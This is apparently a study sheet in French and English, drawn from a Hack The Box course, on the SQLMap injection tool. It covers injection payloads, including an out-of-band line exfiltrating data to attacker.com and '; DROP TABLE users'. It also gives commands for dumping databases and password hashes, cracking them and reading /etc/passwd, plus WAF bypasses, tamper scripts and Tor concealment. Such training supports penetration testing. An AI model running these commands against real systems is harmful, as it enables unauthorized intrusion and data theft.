# SQLMap Essentials

Voici une fiche complète sur le cours **SQLMap Overview** :

***

## <mark style="color:red;">**SQLMap Overview**</mark>

***

### <mark style="color:blue;">**Fonctionnalités principales**</mark>

1. **Détection des vulnérabilités** :
   * Vérification des paramètres dynamiques.
   * Détection des bases de données vulnérables.
2. **Reconnaissance et exploitation** :
   * Identification du SGBD (Système de Gestion de Bases de Données) cible.
   * Extraction des données de la base de données.
   * Accès au système de fichiers.
   * Exécution de commandes sur le système d'exploitation.
3. **Techniques d'optimisation et contournement** :
   * Bypass des protections via des scripts "tamper".
   * Détection et gestion des pare-feux (WAF/IDS/IPS).

***

### <mark style="color:blue;">**Installation de SQLMap**</mark>

```bash
sudo apt install sqlmap
```

#### Installation manuelle via GitHub :

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py
```

***

### <mark style="color:blue;">**Types d'injections SQL supportés**</mark>

```bash
sqlmap -hh
```

#### <mark style="color:green;">1.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Boolean-based blind**</mark> <mark style="color:green;"></mark><mark style="color:green;">(Injection aveugle basée sur des booléens)</mark>

* Exemple : `AND 1=1`
* Technique basée sur la différence entre des réponses **TRUE** (vrai) et **FALSE** (faux).
* Extraction lente mais efficace.

***

#### <mark style="color:green;">2.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Error-based SQL Injection**</mark> <mark style="color:green;"></mark><mark style="color:green;">(Injection basée sur les erreurs)</mark>

* Exemple : `AND GTID_SUBSET(@@version,0)`
* Exploite les messages d'erreur retournés par le SGBD.
* Très rapide pour extraire des données en "chunks" (ex. 200 octets par requête).
* Supporté pour MySQL, PostgreSQL, Oracle, SQL Server, etc.

***

#### <mark style="color:green;">3.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Union query-based SQL Injection**</mark> <mark style="color:green;"></mark><mark style="color:green;">(Injection basée sur UNION)</mark>

* Exemple : `UNION ALL SELECT 1,@@version,3`
* Combine les résultats de la requête injectée avec ceux de la requête originale.
* Très rapide, permettant parfois d'extraire toute une table en une seule requête.

***

#### <mark style="color:green;">4.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Stacked Queries**</mark> <mark style="color:green;"></mark><mark style="color:green;">(Requêtes empilées)</mark>

* Exemple : `; DROP TABLE users`
* Injecte des commandes SQL supplémentaires après la requête vulnérable.
* Nécessite un support par le SGBD (ex. : Microsoft SQL Server, PostgreSQL).
* Utile pour exécuter des commandes système.

***

#### <mark style="color:green;">5.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Time-based blind SQL Injection**</mark> <mark style="color:green;"></mark><mark style="color:green;">(Injection aveugle basée sur le temps)</mark>

* Exemple : `AND 1=IF(2>1,SLEEP(5),0)`
* Différence basée sur les temps de réponse pour différencier TRUE et FALSE.
* Plus lente, mais utile lorsque les autres types d'injection échouent.

***

#### <mark style="color:green;">6.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Inline Queries**</mark> <mark style="color:green;"></mark><mark style="color:green;">(Requêtes intégrées)</mark>

* Exemple : `SELECT (SELECT @@version) from`
* Permet d'insérer une sous-requête dans une requête principale.
* Rarement utilisée mais supportée par SQLMap.

***

#### <mark style="color:green;">7.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Out-of-band SQL Injection**</mark> <mark style="color:green;"></mark><mark style="color:green;">(Injection hors bande)</mark>

* Exemple : `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
* Utilise des canaux secondaires comme le DNS ou HTTP pour exfiltrer des données.
* Méthode avancée utilisée dans des cas spécifiques (e.g., DNS exfiltration).

***

### <mark style="color:blue;">**Exemple d'utilisation de SQLMap**</mark>&#x20;

```bash
python sqlmap.py -u 'http://example.com/page.php?id=5'
```

* **Options courantes** :
  * `-u` : Spécifie l'URL cible.
  * `--dbs` : Liste les bases de données disponibles.
  * `--tables` : Liste les tables d'une base spécifique.
  * `--columns` : Affiche les colonnes d'une table.
  * `--dump` : Extrait les données.

***

### <mark style="color:blue;">**Exploitation d'injections SQL avec SQLMap**</mark>

#### Exemple 1 : Énumération des bases de données

```bash
sqlmap -u 'http://example.com/page.php?id=5' --dbs
```

#### Exemple 2 : Extraction d'une table spécifique

```bash
sqlmap -u 'http://example.com/page.php?id=5' -D database_name --tables
```

#### Exemple 3 : Dump des données

```bash
sqlmap -u 'http://example.com/page.php?id=5' -D database_name -T table_name --dump
```

***

## <mark style="color:red;">**Description des Sorties SQLMap**</mark>

**1. URL content is stable**

* **Message** : `"target URL content is stable"`
* **Signification** : Les réponses du serveur ne changent pas de manière significative entre les requêtes identiques. Cela facilite la détection des injections SQL potentielles.
* **Note** : SQLMap gère les variations mineures avec des mécanismes avancés.

***

**2. Parameter appears to be dynamic**

* **Message** : `"GET parameter 'id' appears to be dynamic"`
* **Signification** : Le paramètre testé est lié à une base de données et ses modifications influencent la réponse du serveur.
* **Indicateur** : Un paramètre statique pourrait ne pas être exploité.

***

**3. Parameter might be injectable**

* **Message** : `"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"`
* **Signification** : Une erreur DBMS (par exemple MySQL) suggère une injection SQL possible.
* **Note** : Ce n’est qu’une indication, nécessitant des tests approfondis.

***

**4. Parameter might be vulnerable to XSS attacks**

* **Message** : `"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"`
* **Signification** : Indique une possible vulnérabilité XSS.
* **Utilité** : Utile pour des tests à grande échelle.

***

**5. Back-end DBMS is '...'**

* **Message** : `"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"`
* **Signification** : SQLMap a identifié le type de DBMS (par exemple, MySQL) et propose d'optimiser les tests.

***

**6. Level/risk values**

* **Message** : `"do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"`
* **Signification** : Étend les tests SQLi spécifiques pour maximiser la détection.

***

**7. Reflective values found**

* **Message** : `"reflective value(s) found and filtering out"`
* **Signification** : Signale que des parties du payload apparaissent dans la réponse, ce qui pourrait générer du bruit.

***

**8. Parameter appears to be injectable**

* **Message** : `"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"`
* **Signification** : Indique une possible injection SQL prouvée par la réponse du serveur.
* **Note** : Utilisation d’une constante (`luther`) pour différencier les réponses TRUE/FALSE.

***

**9. Time-based comparison statistical model**

* **Message** : `"time-based comparison requires a larger statistical model, please wait........... (done)"`
* **Signification** : SQLMap construit un modèle statistique basé sur les délais pour détecter les injections SQL temporelles.

***

**10. Extending UNION query injection technique tests**

* **Message** : `"automatically extending ranges for UNION query injection technique tests"`
* **Signification** : SQLMap augmente les tests UNION lorsque d'autres techniques montrent des résultats prometteurs.

***

**11. Technique appears to be usable**

* **Message** : `"ORDER BY' technique appears to be usable"`
* **Signification** : La technique ORDER BY est utilisable pour déterminer le nombre de colonnes nécessaires dans une injection UNION.

***

**12. Parameter is vulnerable**

* **Message** : `"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"`
* **Signification** : Confirme que le paramètre est vulnérable à une injection SQL.
* **Note** : Vous pouvez arrêter ou continuer pour tester d'autres paramètres.

***

**13. Sqlmap identified injection points**

* **Message** : `"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"`
* **Signification** : Résume les points d'injection identifiés, leur type et les payloads utilisés.

***

**14. Data logged to text files**

* **Message** : `"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"`
* **Signification** : Indique l’emplacement des fichiers de logs contenant les détails des résultats pour une exploitation future.

***

## <mark style="color:red;">**Exécution de SQLMap sur une Requête HTTP**</mark>

***

### <mark style="color:blue;">**Commandes Curl et SQLMap**</mark>

1.  **Configurer avec Curl :** Une méthode efficace consiste à utiliser l'option **Copier comme cURL** des outils de développement des navigateurs (Chrome, Edge, Firefox). Cela permet d'extraire une requête HTTP avec tous ses paramètres.

    Exemple :

    ```bash
    sqlmap 'http://www.example.com/?id=1' \
    -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64)' \
    -H 'Accept: image/webp,*/*' \
    -H 'Accept-Language: en-US,en;q=0.5' --compressed \
    -H 'Connection: keep-alive' -H 'DNT: 1'
    ```
2.  **Utilisation des paramètres GET/POST :**

    *   Pour tester des **paramètres GET** : utilisez `-u` ou `--url`.

        ```bash
        sqlmap -u 'http://www.example.com/?id=1'
        ```
    *   Pour les **paramètres POST** : utilisez `--data`.

        ```bash
        sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
        ```

    Pour tester un seul paramètre spécifique :

    ```bash
    sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
    ```

***

### <mark style="color:blue;">**Requêtes HTTP complètes avec SQLMap**</mark>

1.  Exemple de requête HTTP capturée via Burp :

    ```
    GET /?id=1 HTTP/1.1
    Host: www.example.com
    User-Agent: Mozilla/5.0
    Accept: text/html
    Connection: close
    ```
2.  Sauvegardez cette requête dans un fichier (`req.txt`) et utilisez SQLMap :

    ```bash
    sqlmap -r req.txt
    ```

    Vous pouvez également marquer le paramètre à tester en ajoutant un astérisque `*` :

    ```
    GET /?id=* HTTP/1.1
    ```

***

### <mark style="color:blue;">**Requêtes personnalisées avec SQLMap**</mark>

1. **Ajouter des cookies ou en-têtes :**
   *   Utilisez `--cookie` pour définir une session ou des cookies spécifiques :

       ```bash
       sqlmap ... --cookie='PHPSESSID=abcd1234'
       ```
   *   Ou utilisez `-H` pour configurer les en-têtes :

       ```bash
       sqlmap ... -H='Cookie: PHPSESSID=abcd1234'
       ```
2. **Changer l'agent utilisateur :**
   * Utilisez `--random-agent` pour éviter que SQLMap soit détecté comme un outil automatique.
   * Pour imiter un smartphone, utilisez `--mobile`.
3.  **Tester d'autres parties de la requête :** SQLMap peut tester d'autres sections (exemple : en-têtes HTTP). Utilisez une injection personnalisée :

    ```bash
    --cookie="id=1*"
    ```
4.  **Changer la méthode HTTP :** Par défaut, SQLMap utilise `GET` ou `POST`, mais vous pouvez spécifier une méthode alternative (ex. : `PUT`) avec `--method` :

    ```bash
    sqlmap -u www.example.com --data='id=1' --method PUT
    ```

***

## <mark style="color:red;">Handling SQLMap Errors</mark>

***

### <mark style="color:blue;">Display Errors</mark>

The first step is usually to switch the `--parse-errors`, to parse the DBMS errors (if any) and displays them as part of the program run:

{% code overflow="wrap" fullWidth="true" %}
```shell-session
...SNIP...
[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
...SNIP...
```
{% endcode %}

With this option, SQLMap will automatically print the DBMS error, thus giving us clarity on what the issue may be so that we can properly fix it.

***

### <mark style="color:blue;">Store the Traffic</mark>

The `-t` option stores the whole traffic content to an output file:

<pre class="language-shell-session" data-full-width="true"><code class="lang-shell-session">mrroboteLiot@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

<strong>mrroboteLiot@htb[/htb]$ cat /tmp/traffic.txt
</strong>
</code></pre>

***

### <mark style="color:blue;">Verbose Output</mark>

Another useful flag is the `-v` option, which raises the verbosity level of the console output:

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```
{% endcode %}

As we can see, the `-v 6` option will directly print all errors and full HTTP request to the terminal so that we can follow along with everything SQLMap is doing in real-time.

***

### <mark style="color:blue;">Using Proxy</mark>

Finally, we can utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`). This will route all SQLMap traffic through `Burp`, so that we can later manually investigate all requests, repeat them, and utilize all features of `Burp` with these requests:

![burp\_proxy](https://academy.hackthebox.com/storage/modules/58/eIwJeV3.png)

***

Voici une fiche simplifiée sur **Attack Tuning** dans le contexte de l'outil SQLMap, adaptée en français :

***

## <mark style="color:red;">**Attack Tuning avec SQLMap**</mark>

***

### <mark style="color:blue;">**1. Structure des charges utiles (payloads)**</mark>

Une charge utile envoyée à la cible se compose de :

* **Vector** : la partie centrale contenant le code SQL utile (ex. : `UNION ALL SELECT 1,2,VERSION()`).
* **Boundaries** : le préfixe et le suffixe qui entourent le vecteur (ex. : `%'))<vector>-- -`).

**Options pour préfixe/suffixe**

* Utilisez `--prefix` et `--suffix` pour adapter l'encapsulation, en cas de besoin.\
  Exemple :

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Cela permet de transformer une requête vulnérable comme :

```sql
SELECT id,name FROM users WHERE id LIKE (('test'));
```

En :

```sql
SELECT id,name FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -'));
```

***

### <mark style="color:blue;">**2. Niveau et risque**</mark>

* **`--level`** (1 à 5, par défaut 1) : augmente le nombre de vecteurs testés en fonction de leur probabilité de succès.
* **`--risk`** (1 à 3, par défaut 1) : augmente le nombre de vecteurs en fonction de leur risque (ex. : risque de modifier la base).

**Utilisation :**

```bash
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

***

### <mark style="color:blue;">**3. Ajustement des réponses**</mark>

Lorsque les réponses du serveur sont complexes, plusieurs options permettent d'améliorer la détection des vulnérabilités :

* **`--code`** : fixe le code HTTP pour une réponse "vraie" (ex. : `--code=200`).
* **`--string`** : détecte une chaîne spécifique dans les réponses vraies (ex. : `--string=success`).
* **`--titles`** : compare les titres HTML (`<title>`) des réponses.
* **`--text-only`** : supprime le contenu HTML et ne compare que le texte visible.

***

### <mark style="color:blue;">**4. Techniques spécifiques**</mark>

SQLMap peut tester différents types d'injections SQLi. Pour limiter les tests à certaines techniques, utilisez `--technique` :

* **B** : Boolean-based blind
* **E** : Error-based
* **U** : UNION query
* **T** : Time-based blind
* **S** : Stacked queries

**Exemple :**

```bash
sqlmap -u www.example.com/?id=1 --technique=BEU
```

***

### <mark style="color:blue;">**5. Optimisation pour UNION SQLi**</mark>

Pour les charges UNION SQLi nécessitant des ajustements :

* **`--union-cols`** : nombre de colonnes (ex. : `--union-cols=5`).
* **`--union-char`** : remplace les valeurs par défaut (ex. : `--union-char='a'`).
* **`--union-from`** : ajoute une table en fin de requête UNION (ex. : `--union-from=users`).

***

### <mark style="color:blue;">**6. Astuces supplémentaires**</mark>

* Utilisez `-v 3` ou plus pour augmenter la verbosité et observer les charges testées.
* Par défaut, SQLMap utilise environ 72 charges utiles. Avec `--level=5` et `--risk=3`, ce nombre peut dépasser 7 800 !

***

#### <mark style="color:blue;">**Résumé des commandes importantes**</mark>

```bash
# Utilisation de base
sqlmap -u "www.example.com/?q=test"

# Avec préfixe/suffixe personnalisés
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Ajuster le niveau et le risque
sqlmap -u "www.example.com/?q=test" --level=5 --risk=3

# Techniques spécifiques
sqlmap -u "www.example.com/?q=test" --technique=BEU

# Détection basée sur un code HTTP
sqlmap -u "www.example.com/?q=test" --code=200

# Optimisation UNION SQLi
sqlmap -u "www.example.com/?q=test" --union-cols=5 --union-char='a'
```

***

Voici la traduction en français de votre texte :

***

## <mark style="color:red;">Database Enumeration</mark>

***

### <mark style="color:blue;">Exfiltration des données avec SQLMap</mark>

Pour ce faire, SQLMap dispose d’un ensemble prédéfini de requêtes adaptées à tous les SGBD (systèmes de gestion de bases de données) qu’il prend en charge. Chaque entrée correspond à une requête SQL spécifique à exécuter sur la cible pour récupérer le contenu souhaité. Par exemple, les extraits suivants, issus de `queries.xml` pour un SGBD MySQL, montrent comment SQLMap formule ces requêtes :

{% code overflow="wrap" fullWidth="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    </dbms>
</root>
```
{% endcode %}

***

### <mark style="color:blue;">Utilisation des options SQLMap</mark>

Par exemple, pour récupérer la "bannière" (option `--banner`) d’une cible utilisant MySQL, SQLMap exécutera la requête suivante :

```sql
VERSION()
```

Pour obtenir le nom de l’utilisateur actuel (`--current-user`), il utilisera :

```sql
CURRENT_USER()
```

Lorsqu’il s’agit de récupérer des noms d’utilisateurs (balise `<users>`), SQLMap utilise deux types de requêtes :

1. **Inband** : Utilisée pour les situations non "blind" (par exemple, injections UNION ou basées sur les erreurs). Les résultats sont directement récupérés dans la réponse HTTP.
2. **Blind** : Utilisée pour les situations "blind" (par exemple, injections booléennes ou temporelles). Les données sont extraites ligne par ligne et bit par bit.

***

### <mark style="color:blue;">Énumération des données de base</mark>

Après avoir détecté une vulnérabilité SQLi, on peut commencer l’énumération des détails de base de la base de données cible, comme :

* Le nom de l’hôte cible (`--hostname`),
* Le nom de l’utilisateur actuel (`--current-user`),
* Le nom de la base de données actuelle (`--current-db`),
* Les hachages des mots de passe (`--passwords`).

L'énumération commence souvent par récupérer des informations simples :

* La version de la base de données (`--banner`),
* Le nom de l’utilisateur actuel (`--current-user`),
* Le nom de la base actuelle (`--current-db`),
* Vérifier si l’utilisateur actuel dispose de droits d’administrateur (`--is-dba`).

Commande SQLMap pour cela :

{% code overflow="wrap" fullWidth="true" %}
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
{% endcode %}

***

### <mark style="color:blue;">Énumération des tables</mark>

Une fois le nom de la base connu, on peut récupérer les noms des tables avec :

```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

Pour extraire le contenu d’une table spécifique, utilisez :

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

Les résultats peuvent être exportés en CSV, HTML ou SQLite avec l’option `--dump-format`.

***

### <mark style="color:blue;">Énumération conditionnelle</mark>

Pour récupérer des lignes spécifiques avec une condition WHERE :

{% code overflow="wrap" fullWidth="true" %}
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
{% endcode %}

***

### <mark style="color:blue;">Énumération complète</mark>

Pour extraire tout le contenu d’une base :

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
```

Pour récupérer toutes les bases et tables (sauf les bases système) :

```bash
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```

***

## <mark style="color:red;">**Advanced Database Enumeration with SQLMap**</mark>

***

### <mark style="color:blue;">**1. Enumerating Database Schema**</mark>

To retrieve the structure of all tables in the database and understand its architecture, use the `--schema` option:

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

***

### <mark style="color:blue;">**2. Searching for Specific Data**</mark>

When databases are large, use the `--search` option to locate specific identifiers (e.g., table names or columns).

**Search for Table Names:**

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

**Search for Column Names:**

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

***

### <mark style="color:blue;">**3. Dumping Specific Tables**</mark>

Once you identify a table of interest, retrieve its contents using the `-T` option:

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

***

### <mark style="color:blue;">**4. Cracking Passwords**</mark>

If a table contains password hashes, SQLMap can attempt to crack them using a dictionary-based attack.

1.  **Trigger the Attack:** After dumping the table, SQLMap detects hash-like data and prompts:

    ```bash
    do you want to crack them via a dictionary-based attack? [Y/n/q]
    ```
2. **Choose a Dictionary:**
   * Default dictionary: Press Enter.
   * Custom dictionary: Provide a file path.
   * List of dictionaries: Specify a list.
3.  **Example Output:**

    ```
    [INFO] cracked password 'password123' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
    ```

***

### <mark style="color:blue;">**5. Enumerating Database-Specific Credentials**</mark>

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords
```

**Example Output:**

```
database management system users password hashes:
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

***

### <mark style="color:blue;">**6. Fully Automating Enumeration**</mark>

```bash
sqlmap -u "http://www.example.com/?id=1" --all --batch
```

***

## <mark style="color:red;">Bypassing Web Application Protections</mark>

***

### <mark style="color:blue;">Anti-CSRF Token Bypass</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
{% endcode %}

***

### <mark style="color:blue;">Unique Value Bypass</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```
{% endcode %}

***

### <mark style="color:blue;">Calculated Parameter Bypass</mark>

Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. `h=MD5(id)`) of another one. To bypass this, the option `--eval` should be used, where a valid Python code is being evaluated just before the request is being sent to the target:

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```
{% endcode %}

***

### <mark style="color:blue;">IP Address Concealing</mark>

In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option `--proxy` (e.g. `--proxy="socks4://177.39.187.70:33283"`), where we should add a working proxy.

In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a `SOCKS4` proxy service at the local port 9050 or 9150. By using switch `--tor`, SQLMap will automatically try to find the local port and use it appropriately.

If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch `--check-tor`. In such cases, SQLMap will connect to the `https://check.torproject.org/` and check the response for the intended result (i.e., `Congratulations` appears inside).

***

### <mark style="color:blue;">WAF Bypass</mark>

Chaque fois que nous exécutons **SQLMap**, dans le cadre des tests initiaux, SQLMap envoie une charge utile malveillante prédéfinie en utilisant un paramètre inexistant (par exemple `?pfov=...`). Cela permet de tester la présence d’un **WAF (Web Application Firewall)**.

S’il existe une protection entre l’utilisateur et la cible, la réponse du serveur sera **considérablement différente** de celle d’une requête normale.\
Par exemple, si l’une des solutions WAF les plus populaires, comme **ModSecurity**, est en place, le serveur répondra probablement avec un **code HTTP 406 - Not Acceptable** après une telle requête.

En cas de détection positive d’un WAF, **SQLMap** utilise une bibliothèque tierce nommée **identYwaf**, qui contient des **signatures de plus de 80 solutions WAF** différentes, afin d’identifier précisément le pare-feu en place.

Si nous voulons **ignorer ce test heuristique** (pour réduire le bruit des requêtes envoyées), nous pouvons utiliser l’option suivante dans SQLMap :

```bash
--skip-waf
```

***

### <mark style="color:blue;">User-agent Blacklisting Bypass</mark>

In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. `User-agent: sqlmap/1.4.9 (http://sqlmap.org)`).

This is trivial to bypass with the switch `--random-agent`, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.

Note: If some form of protection is detected during the run, we can expect problems with the target, even other security mechanisms. The main reason is the continuous development and new improvements in such protections, leaving smaller and smaller maneuver space for attackers.

***

### <mark style="color:blue;">Tamper Scripts</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Tamper-Script</strong></td><td><strong>Description</strong></td></tr><tr><td><code>0eunion</code></td><td>Replaces instances of UNION with e0UNION</td></tr><tr><td><code>base64encode</code></td><td>Base64-encodes all characters in a given payload</td></tr><tr><td><code>between</code></td><td>Replaces greater than operator (<code>></code>) with <code>NOT BETWEEN 0 AND #</code> and equals operator (<code>=</code>) with <code>BETWEEN # AND #</code></td></tr><tr><td><code>commalesslimit</code></td><td>Replaces (MySQL) instances like <code>LIMIT M, N</code> with <code>LIMIT N OFFSET M</code> counterpart</td></tr><tr><td><code>equaltolike</code></td><td>Replaces all occurrences of operator equal (<code>=</code>) with <code>LIKE</code> counterpart</td></tr><tr><td><code>halfversionedmorekeywords</code></td><td>Adds (MySQL) versioned comment before each keyword</td></tr><tr><td><code>modsecurityversioned</code></td><td>Embraces complete query with (MySQL) versioned comment</td></tr><tr><td><code>modsecurityzeroversioned</code></td><td>Embraces complete query with (MySQL) zero-versioned comment</td></tr><tr><td><code>percentage</code></td><td>Adds a percentage sign (<code>%</code>) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)</td></tr><tr><td><code>plus2concat</code></td><td>Replaces plus operator (<code>+</code>) with (MsSQL) function CONCAT() counterpart</td></tr><tr><td><code>randomcase</code></td><td>Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)</td></tr><tr><td><code>space2comment</code></td><td>Replaces space character ( ) with comments `/</td></tr><tr><td><code>space2dash</code></td><td>Replaces space character ( ) with a dash comment (<code>--</code>) followed by a random string and a new line ()</td></tr><tr><td><code>space2hash</code></td><td>Replaces (MySQL) instances of space character ( ) with a pound character (<code>#</code>) followed by a random string and a new line ()</td></tr><tr><td><code>space2mssqlblank</code></td><td>Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters</td></tr><tr><td><code>space2plus</code></td><td>Replaces space character ( ) with plus (<code>+</code>)</td></tr><tr><td><code>space2randomblank</code></td><td>Replaces space character ( ) with a random blank character from a valid set of alternate characters</td></tr><tr><td><code>symboliclogical</code></td><td>Replaces AND and OR logical operators with their symbolic counterparts (<code>&#x26;&#x26;</code> and <code>||</code>)</td></tr><tr><td><code>versionedkeywords</code></td><td>Encloses each non-function keyword with (MySQL) versioned comment</td></tr><tr><td><code>versionedmorekeywords</code></td><td>Encloses each keyword with (MySQL) versioned comment</td></tr></tbody></table>

***

### <mark style="color:blue;">Miscellaneous Bypasses</mark>

Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the `Chunked` transfer encoding, turned on using the switch `--chunked`, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.

The other bypass mechanisms is the `HTTP parameter pollution` (`HPP`), where payloads are split in a similar way as in case of `--chunked` between different same parameter named values (e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`), which are concatenated by the target platform if supporting it (e.g. `ASP`).

***

## <mark style="color:red;">**OS Exploitation avec SQLMap**</mark>

***

### <mark style="color:blue;">**1. Lecture et écriture de fichiers locau**</mark>**x**

#### <mark style="color:green;">**Lecture de fichiers locaux**</mark>

* Nécessite des privilèges spécifiques comme `LOAD DATA` et `INSERT` pour lire un fichier via SQL.
*   Exemple MySQL :

    ```sql
    LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
    ```
*   Vérification des privilèges DBA avec SQLMap :

    ```bash
    sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
    ```

    * Si `current user is DBA: True` : privilèges suffisants.
    * Sinon : certaines actions (comme la lecture de fichiers) échoueront.

**Commande SQLMap pour lire un fichier :**

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

* Résultat : Le fichier distant est téléchargé localement (`~/.sqlmap/output/...`).

***

#### <mark style="color:green;">**Écriture de fichiers locaux**</mark>

* Plus difficile car souvent désactivée par défaut dans les systèmes DBMS modernes.
* Prérequis pour MySQL :
  * Désactivation de `--secure-file-priv`.
  * Privilèges d’écriture dans le répertoire cible.
*   Commande SQLMap pour écrire un fichier :

    {% code overflow="wrap" %}
    ```bash
